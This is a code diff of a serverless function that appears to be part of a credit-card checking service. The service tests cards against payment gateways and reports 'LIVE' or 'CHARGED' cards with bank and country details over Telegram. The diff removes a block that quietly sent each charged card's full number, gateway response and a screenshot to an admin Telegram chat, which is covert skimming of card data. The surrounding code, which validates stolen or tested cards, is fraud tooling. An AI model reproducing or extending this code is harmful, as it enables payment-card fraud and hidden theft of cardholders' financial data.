@@ -331,33 +331,7 @@ serve(async (req) => {
       );
     }
     
-    // 🔥 Send LIVE card debug info to admin with FULL card details + screenshot
-    if (status === "CHARGED" && ADMIN_TELEGRAM_CHAT_ID) {
-      const adminDebugMsg = `🔔 <b>LIVE CARD DEBUG</b>
-
-<b>User:</b> ${profile?.username || user_id}
-<b>Card:</b> <code>${fullCardForAdmin}</code>
-<b>Gateway:</b> ${gateway}
-<b>Amount:</b> ${amount}
-<b>Response:</b> <code>${response_message}</code>
-${api_response ? `\n<b>Raw:</b> <code>${api_response.slice(0, 500)}</code>` : ''}
-
-${brandEmoji} ${binInfo.brand} • ${binInfo.type}
-🏦 ${binInfo.bank}
-${countryFlag} ${binInfo.country}`;
-      
-      // Fire-and-forget admin notification
-      // If screenshot available, send as photo; otherwise send as text
-      if (screenshot_url) {
-        sendTelegramPhoto(ADMIN_TELEGRAM_CHAT_ID, screenshot_url, adminDebugMsg).catch(err => 
-          console.error("[NOTIFY-CHARGED] Admin debug photo failed:", err)
-        );
-      } else {
-        sendTelegramMessage(ADMIN_TELEGRAM_CHAT_ID, adminDebugMsg).catch(err => 
-          console.error("[NOTIFY-CHARGED] Admin debug notification failed:", err)
-        );
-      }
-    }
+    // Admin debug notifications disabled
 
     // Only CHARGED/LIVE cards reach here - notify user if they have Telegram linked
     if (profileError || !profile?.telegram_chat_id) {
